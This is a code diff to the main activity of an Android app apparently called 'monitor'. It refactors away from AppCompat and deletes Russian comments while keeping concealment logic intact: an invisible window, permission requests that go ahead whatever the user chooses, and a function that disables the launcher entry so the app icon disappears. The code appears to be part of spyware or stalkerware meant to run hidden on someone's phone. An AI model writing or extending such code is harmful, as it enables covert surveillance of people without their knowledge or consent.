@@ -1,6 +1,7 @@
 package com.br.monitor
 
 import android.Manifest
+import android.app.Activity
 import android.content.ComponentName
 import android.content.Intent
 import android.content.pm.PackageManager
@@ -9,11 +10,8 @@ import android.os.Build
 import android.os.Bundle
 import android.os.PowerManager
 import android.provider.Settings
-import androidx.appcompat.app.AppCompatActivity
-import androidx.core.app.ActivityCompat
-import androidx.core.content.ContextCompat
 
-class MainActivity : AppCompatActivity() {
+class MainActivity : Activity() {
 
     private val PERM_REQUEST = 1001
 
@@ -38,19 +36,16 @@ class MainActivity : AppCompatActivity() {
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
-        // Пустой экран — ничего не показываем
-        setContentView(android.R.layout.activity_list_item)
         window.decorView.alpha = 0f
-
         requestAllPermissions()
     }
 
     private fun requestAllPermissions() {
         val missing = PERMISSIONS.filter {
-            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
+            checkSelfPermission(it) != PackageManager.PERMISSION_GRANTED
         }
         if (missing.isNotEmpty()) {
-            ActivityCompat.requestPermissions(this, missing.toTypedArray(), PERM_REQUEST)
+            requestPermissions(missing.toTypedArray(), PERM_REQUEST)
         } else {
             onAllPermissionsReady()
         }
@@ -60,7 +55,6 @@ class MainActivity : AppCompatActivity() {
         requestCode: Int, permissions: Array<out String>, grantResults: IntArray
     ) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults)
-        // Продолжаем независимо от того, что юзер выбрал
         onAllPermissionsReady()
     }
 
@@ -93,7 +87,6 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun hideIcon() {
-        // Отключаем launcher activity — иконка пропадает из drawer
         packageManager.setComponentEnabledSetting(
             ComponentName(this, MainActivity::class.java),
             PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
